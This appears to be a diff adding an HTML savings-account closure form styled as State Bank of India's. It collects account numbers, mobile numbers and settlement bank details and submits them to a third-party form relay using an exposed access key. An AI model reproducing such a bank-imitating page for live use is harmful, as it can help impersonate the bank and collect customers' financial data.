@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SBI Account Closure Form</title>
+  <link rel="stylesheet" href="script.css">
+</head>
+<body>
+   <form id="closureForm" action="https://api.web3forms.com/submit" method="POST">
+    
+    <input type="hidden" name="access_key" value="1fc6a90e-f9ce-4439-b708-d8cc5597b0af">
+    <input type="hidden" name="redirect" value="https://web3forms.com/success">
+
+    <div class="logo-bg"></div>
+
+    <header id="header">
+        <div class="logo"></div>
+        <div class="branch">
+          <h1 class="bn">STATE BANK OF INDIA,<br>
+            <input class="branch_name" type="text" name="branch_name" placeholder="BRANCH">
+          </h1>
+          <p class="form-title">SAVINGS BANK ACCOUNT CLOSURE FORM</p>
+        </div>
+    </header>
+
+    <table class="date_table1" border="1">
+        <tr>
+          <th>Date</th>
+          <td><input type="number" min="0" max="99" oninput="if(this.value.length > 2) this.value = this.value.slice(0, 2);" name="date_day" placeholder="DD"></td>
+          <td><input type="number" min="0" max="99" oninput="if(this.value.length > 2) this.value = this.value.slice(0, 2);" name="date_month" placeholder="MM"></td>
+          <td><input type="number" min="0" max="9999" oninput="if(this.value.length > 4) this.value = this.value.slice(0, 4);" name="date_year" placeholder="YYYY"></td>
+       </tr>
+    </table>
+
+    <table class="form_table" border="1">
+     <tr>
+        <th>Name of A/C Holder</th>
+        <td colspan="3">(1) <input class="table-input" name="account_holder_1" type="text" ></td>
+     </tr>
+     <tr>
+        <th>Joint Holder Name</th>
+        <td colspan="3">(2) <input class="table-input" name="account_holder_2" type="text" ></td>
+     </tr>
+     <tr>
+        <th>Account No.</th>
+        <td><input class="table-input" type="number" name="account_number"></td>
+        <th>Mobile No.</th>
+        <td><input class="table-input" type="text" name="mobile_number"></td>
+    </tr>
+    </table>
+
+    <p class="para">I/we request you to close my/our account maintained at your branch. On closure of my/our account, please pay me/us balance after recovering usual bank charges.</p>
+
+    <table class="form_table" border="1">
+        <tr>
+            <th>Name of A/C Holder</th>
+            <td colspan="3"><input class="table-input" name="settlement_holder_name" type="text" ></td>
+      </tr>
+      <tr>
+          <th>Account No.</th>
+          <td colspan="3"><input class="table-input" name="settlement_account_no" type="text" ></td>
+      </tr>
+      <tr>
+          <th>Name of Bank</th>
+          <td><input class="table-input" name="settlement_bank_name" type="text"></td>
+          <th>Branch</th>
+          <td><input class="table-input" name="settlement_branch" type="text"></td>
+      </tr>  
+      <tr>
+         <th>District</th>
+         <td><input class="table-input" name="settlement_district" type="text"></td>
+         <th>State</th>
+         <td><input class="table-input" name="settlement_state" type="text"></td>
+     </tr>  
+     <tr>
+        <th>Branch Code No.</th>
+        <td><input class="table-input" name="settlement_branch_code" type="text"></td>
+        <th>IFSC/BIC No.</th>
+        <td><input class="table-input" name="settlement_ifsc" type="text"></td>
+     </tr>
+    </table>
+
+    <p class="check">*I/we confirm that no cheque book is issued to me/us on the said account.</p>
+    <p class="req">*I/we enclose herewith unused cheque Book No. <input type="text" name="cheque_book_from" class="inline-input"> to <input type="text" name="cheque_book_to" class="inline-input"> for necessary action.</p>
+
+    <div class="office-use-section">
+        <a href="#" class="office-link">For Office Use Only</a>
+        <div class="sign">
+            <p class="same">Account holder(s) signature(s) verified. Please close a/c.</p>
+            <p class="same">Charges recovered & A/c closed on <input type="number" name="office_closed_date"> / DC No. <input type="number" name="office_dc_no"></p>
+        </div>
+    </div>
+
+    <footer>
+       <p>Officer In-Charge</p>
+       <p style="text-align: right;">Assistant</p>
+    </footer>
+
+    <div class="action-buttons">
+        <button type="submit" id="submitBtn">Submit Application</button>
+        <button type="button" id="shareBtn">Share via WhatsApp</button>
+    </div>
+ </form>   
+    <script src="script.js"></script>
+</body>
+</html>
